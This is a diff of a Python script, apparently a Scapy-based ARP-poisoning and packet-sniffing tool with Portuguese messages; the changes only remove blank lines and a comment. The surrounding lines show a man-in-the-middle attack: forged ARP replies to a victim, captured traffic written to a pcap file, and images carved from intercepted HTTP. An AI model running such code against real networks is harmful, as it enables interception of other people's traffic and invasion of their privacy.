@@ -20,9 +20,7 @@ def get_mac(ip_address):
         return r[Ether].src
     return None
 
-
 gateway_mac = get_mac(GW)
-
 if gateway_mac is None:
  print("[XXXXX]Falha ao obter o endereco MAC...")
  sys.exit(0)
@@ -36,12 +34,10 @@ if(target_mac is None):
  sys.exit(0)
 else:
  print("[********] Alvo %s esta no ip %s "%(target_mac,VIP))
-
-print('__________________________________________________________________\n')
+print('_________________________________________________________________\n')
 
 def dnshandle(pkt):
  try:
-     #print('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n')
      send(pkt)
      host = 'Indefined'
      wrpcap(pcap_file,pkt,append=True)
@@ -76,8 +72,6 @@ def dnshandle(pkt):
    print('[-]Error:/n %s'%sys.exc_info()[0])
    sys.exit(1)
   
-         
-       
 def v_poison():
      v = ARP(pdst=VIP,psrc = GW)
      while True:
@@ -100,10 +94,6 @@ def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
     os.kill(os.getpid(), signal.SIGINT)
  except:
     sys.exit(1)
-
-
-
-
 
 def http_assembler(pcap_file):
     carved_images = 0
@@ -138,7 +128,6 @@ def http_assembler(pcap_file):
                     pass '''
     return carved_images, faces_detected
 
-
 def get_http_headers(http_payload):
     try:
         # split the headers off if it is HTTP traffic
@@ -150,7 +139,6 @@ def get_http_headers(http_payload):
     if "Content-Type" not in headers:
         return None
     return headers
-
 
 def extract_image(headers,http_payload):
     image = None
